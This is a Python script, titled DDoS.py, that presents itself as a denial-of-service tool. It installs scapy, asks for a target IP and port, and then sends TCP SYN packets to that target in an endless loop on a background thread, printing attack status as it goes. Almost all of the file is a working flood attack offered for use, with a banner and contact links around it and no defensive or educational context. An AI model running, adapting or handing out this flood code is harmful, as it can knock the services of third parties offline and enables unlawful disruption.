#DDoS.py

#Imports:
import os
import sys
import socket
from platform import platform
from os import listdir
os.system('pip3 install scapy')
from scapy.all import *
import threading
version = 'v Alpha 0.4'
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

# Change version in var

title = '''

A DDoS/ DoS script written in Python, the upgraded version of the Batch version.

srforek

 __  _ ___ ___ __  _ ___        __  __   __    __
|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/
| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`.
|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/


'''+version+'''

:DDoS/ DoS python script:

By editor99


Github repo: https://github.com/Gteditor99/DDOS-Nzen2

Youtube: https://www.youtube.com/channel/UCrxNyJTsVtg5pSq3AYbhiAw

Discord: editor99#6207



        '''


logoascii = '''

 __  _ ___ ___ __  _ ___        __  __   __    __
|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/
| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`.
|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/



             '''


# Function for Main Screen, (mainscr) for easy access.
def mainscr():

    os.system("cls")
    print(title)

    os.system("pause")
mainscr()
os.system("cls")
sc2 = '''
    Enter the destination IP Address:
    then,
    Enter the port:

    ex: xxx.xxx.x.x (Enter)
    xx (Enter)


      (Localhost is the Local IP)
      (Port 80 is the most common ICP, HTTP. )

       '''
# Function for Second Screen, (secondscr) for easy access.
def secondscr():
    os.system('cls')

    print(sc2)

    print(logoascii)

print(secondscr())

target_ip = input("IP:")
target_port = input("Port:")


destip = target_ip
destport = target_port


packets_sent = 0

def attack():
    while True:
        p = IP(dst= target_ip) / TCP(flags="S",  sport=RandShort(),  dport=int(target_port))
        send(p , verbose=1, loop=0)
        global packets_sent
        packets_sent += 1
        
        print(infoui)

#infoui
infoui = threading.Thread(target=attack)
infoui.start()

print('\n')
print('[*] Attack started')
print('')
print('[*] Target IP: ' + target_ip)
print('[*] Target Port: ' + target_port)
print('')
print('[*] Packets sent: ' + str(packets_sent))
print('[*] Press CTRL + C to stop the attack')
print('')
print('[*] Press any key to continue')

input()

    


input("Press Enter to exit:")

# Yo buddy, still alive?
